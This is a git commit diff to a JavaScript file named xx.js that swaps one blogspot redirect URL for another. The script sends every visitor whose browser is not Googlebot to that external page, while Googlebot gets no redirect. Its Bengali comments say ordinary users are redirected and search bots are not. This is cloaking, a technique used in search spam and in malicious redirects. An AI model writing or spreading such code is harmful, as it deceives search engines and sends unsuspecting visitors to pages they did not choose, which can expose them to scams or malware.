2d7c5604a5163f42b8e46cd6e1b86d9845dcce31
spineonlinebd-cyber <spineonlinebd@gmail.com>
2026-07-02 15:51:10 +0600

    Update xx.js

--- xx.js
+++ xx.js
@@ -1,6 +1,7 @@
 if (!navigator.userAgent.includes('Googlebot')) {
   // সাধারণ ব্যবহারকারীদের জন্য - রিডাইরেক্ট হবে
-  window.location.href = "https://mrlive424.blogspot.com/2026/06/piki.html";
+  window.location.href = "https://vaiya-ekhon-saiyaaa.blogspot.com/2026/07/ves.html";
 } else {
   // সার্চ ইঞ্জিন বটের জন্য - কোনো রিডাইরেক্ট হবে না
   console.log("Thanks for visiting my page" );
+}
